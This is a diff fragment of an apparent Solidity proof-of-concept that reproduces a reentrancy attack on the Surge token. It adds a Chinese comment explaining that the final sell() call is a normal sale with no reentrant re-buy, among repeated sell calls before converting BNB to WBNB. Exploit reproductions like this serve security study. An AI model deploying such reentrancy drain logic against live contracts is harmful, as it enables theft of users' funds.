@@ -213,6 +213,8 @@ contract  test{
         Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));
         Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));
         Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));
+        
+        //最后一次卖出为正常的卖出操作, 不再通过重入再次购买
         Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));
         
         //把所有BNB换成WBNB
